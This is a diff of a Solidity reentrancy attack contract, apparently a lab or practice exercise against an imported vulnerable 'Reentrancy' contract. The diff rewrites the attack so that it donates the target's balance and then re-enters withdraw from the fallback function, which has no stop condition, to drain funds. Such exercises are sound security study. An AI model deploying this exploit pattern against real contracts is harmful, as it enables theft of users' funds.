@@ -5,24 +5,30 @@ import "./Reentrancy.sol";
 
 contract ReentrancyAttack {
     Reentrancy public target;
+    uint256 public attackAmount;
+    event Withdraw(uint256 amount);
 
-    constructor(address payable _etherStoreAddress) {
-        target = Reentrancy(_etherStoreAddress);
+    constructor(address payable _target) {
+        target = Reentrancy(_target);
+        attackAmount = address(target).balance;
     }
 
     function getBalance() public view returns (uint256) {
         return address(this).balance;
     }
 
-    function attack() external payable {
-        // require(msg.value >= 1);
-        target.donate{value: 3 wei, gas: 40000000}(address(this));
-        target.withdraw(1 wei);
+    function withdraw() internal {
+        target.withdraw(attackAmount);
+        emit Withdraw(attackAmount);
+    }
+
+    // We have to send ETH within this function, the exact amount of <attackAmount>, otherwise it will not work.
+    function attack() public payable {
+        target.donate{value: attackAmount}(address(this));
+        withdraw();
     }
 
     fallback() external payable {
-        if (address(target).balance >= 0) {
-            target.withdraw (1 wei);
-        }
+        withdraw();
     }
 }
